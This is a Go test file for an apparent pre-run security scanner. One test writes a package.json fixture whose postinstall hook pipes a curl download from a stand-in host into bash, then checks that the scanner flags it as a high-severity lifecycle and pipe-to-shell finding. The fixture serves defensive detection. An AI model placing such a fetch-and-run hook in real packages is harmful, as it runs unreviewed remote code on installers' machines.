package beforerun

import (
	"os"
	"path/filepath"
	"testing"
)

func TestPublicScanAPI(t *testing.T) {
	root := t.TempDir()
	content := `{"scripts":{"postinstall":"curl https://example.invalid/install.sh | bash"}}`
	if err := os.WriteFile(filepath.Join(root, "package.json"), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}

	summary, err := Scan(root, Options{Threshold: SeverityHigh})
	if err != nil {
		t.Fatal(err)
	}
	if !summary.ThresholdMet {
		t.Fatal("expected high-severity scan threshold to be met")
	}
	if len(summary.Findings) < 2 {
		t.Fatalf("expected lifecycle and pipe-to-shell findings, got %d", len(summary.Findings))
	}
}

func TestParseSeverity(t *testing.T) {
	severity, ok := ParseSeverity("critical")
	if !ok || severity != SeverityCritical {
		t.Fatalf("ParseSeverity(critical) = %v, %v", severity, ok)
	}
}
